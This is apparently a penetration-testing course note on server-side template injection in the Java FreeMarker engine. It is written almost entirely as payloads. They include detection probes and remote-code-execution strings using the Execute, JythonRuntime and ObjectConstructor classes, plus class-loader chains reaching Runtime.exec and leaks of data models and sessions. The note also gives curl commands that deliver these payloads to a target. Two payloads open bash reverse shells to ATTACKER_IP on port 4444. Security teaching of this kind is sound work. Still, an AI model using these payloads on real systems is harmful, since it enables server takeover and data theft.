---
tags: [vapt, ssti, advanced]
difficulty: advanced
module: "09 - SSTI"
topic: "09.06 SSTI in FreeMarker (Java)"
---

# 09.06 — SSTI in FreeMarker (Java)

## FreeMarker Basics

FreeMarker is a Java template engine widely used in Apache Struts, Spring MVC, Alfresco, and many enterprise applications. SSTI here leads to Java-level RCE.

```
SYNTAX:
  ${variable}             → output variable
  ${7*7}                  → 49
  ${.now?string}          → current datetime
  <#assign x = 5>         → variable assignment
  <#if x > 3>...</#if>   → conditional
  <#list items as item>...</#list>  → loop
  ${"hello"?upper_case}  → string function

DETECTION:
  ${7*7}   → 49 = FreeMarker (or Velocity)
  ${.version} → FreeMarker version number!
```

---

## FreeMarker RCE via Execute Class

```java
// METHOD 1: freemarker.template.utility.Execute
// (CLASSIC — works in older FreeMarker versions):
${"freemarker.template.utility.Execute"?new()("id")}
// → Creates a new Execute object → calls its default method with "id"!

// FULL COMMAND EXECUTION:
${"freemarker.template.utility.Execute"?new()("id")}
${"freemarker.template.utility.Execute"?new()("whoami")}
${"freemarker.template.utility.Execute"?new()("cat /etc/passwd")}

// REVERSE SHELL:
${"freemarker.template.utility.Execute"?new()("bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'")}

// NOTE: Execute class was removed/restricted in newer FreeMarker (2.3.30+)
```

---

## FreeMarker RCE via JythonRuntime

```java
// IF Execute IS BLOCKED — TRY JythonRuntime:
${"freemarker.template.utility.JythonRuntime"?new()?eval("import os; os.system('id')")}
```

---

## FreeMarker RCE via ObjectConstructor

```java
// ObjectConstructor still works in many versions:
<#assign ex="freemarker.template.utility.Execute"?new()>
${ex("id")}

// MULTI-STEP:
<#assign classloader=object?api.class.protectionDomain.classLoader>
<#assign owc=classloader.loadClass("freemarker.template.utility.ObjectConstructor")>
<#assign ooc=owc.newInstance()>
${ooc("freemarker.template.utility.Execute","id")}
```

---

## FreeMarker Object Access

```java
// ACCESS JAVA CLASSES (via api() extension):
${object?api.class}              → get class of object
${object?api.class.name}         → class name string

// IF ?api IS ENABLED (it's a config option):
${.data_model?api}               → data model access
${.data_model?api.class}         → class info

// JAVA RUNTIME ACCESS:
<#assign runtime = "java.lang.Runtime"?new()>  ← won't work directly, need ?new()

// BETTER - USE CLASS.FORNAME:
<#assign classloader = "test"?api.class.classLoader>
<#assign runtimeClass = classloader.loadClass("java.lang.Runtime")>
<#assign getRuntime = runtimeClass.getMethod("getRuntime")>
<#assign runtime = getRuntime.invoke(null)>
<#assign exec = runtime.exec("id")>
```

---

## FreeMarker Data Model Leak

```java
// LEAK AVAILABLE VARIABLES:
${.data_model}           → all template variables
${.main}                 → main data model
${.globals}              → global variables
${.now}                  → current datetime
${.version}              → FreeMarker version
${.template_name}        → current template name
${.current_template_name} → current template

// THESE CAN REVEAL:
// Database connections, user objects, configuration data
// System properties, environment variables
// Other sensitive template context data
```

---

## FreeMarker Configuration Access

```java
// IF Application/Config OBJECTS ARE IN TEMPLATE CONTEXT:
${application}           → servlet context
${application.initParameter("some.config.value")}
${session}               → HTTP session
${session.getAttribute("user")}
${request}               → HTTP request
${request.serverName}
${request.remoteAddr}
```

---

## Where FreeMarker is Common

```
HIGH-VALUE TARGETS:
  Apache Struts          → Many CVEs involving FreeMarker SSTI
  Spring MVC             → Legacy apps
  Alfresco               → Document management
  Confluence (Atlassian) → Wiki/collaboration (uses Velocity too)
  JIRA (Atlassian)       → Issue tracking

CVE EXAMPLES:
  CVE-2017-5638 (Struts) → Not FreeMarker but same app stack
  CVE-2021-26084 (Confluence) → OGNL injection, similar concept
  
NOTE: Enterprise Java apps often have more privileged access
→ SSTI in enterprise app can mean full server takeover!
```

---

## Detection and Exploitation

```bash
# DETECT:
curl -s "https://target.com/?name=%24%7B7*7%7D" | grep "49"
# ${7*7} URL-encoded = %24%7B7*7%7D

# CONFIRM FREEMARKER:
curl -s "https://target.com/?name=%24%7B.version%7D"
# ${.version} → should show FreeMarker version number

# RCE:
curl -s "https://target.com/?name=%24%7B%22freemarker.template.utility.Execute%22%3Fnew()(%22id%22)%7D"
# ${freemarker.template.utility.Execute?new()("id")} URL-encoded

# REVERSE SHELL:
PAYLOAD='${"freemarker.template.utility.Execute"?new()("bash -c '"'"'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'"'"'")}'
curl -s -G "https://target.com/page" --data-urlencode "name=$PAYLOAD"
```

---

## Related Notes
- [[03 - Detecting SSTI]] — detection methodology
- [[04 - SSTI in Jinja2]] — Python equivalent
- [[07 - SSTI in ERB]] — Ruby equivalent
- [[08 - SSTI to RCE Escalation]] — full RCE workflow
- [[10 - SSTImap Tool Usage]] — automated exploitation
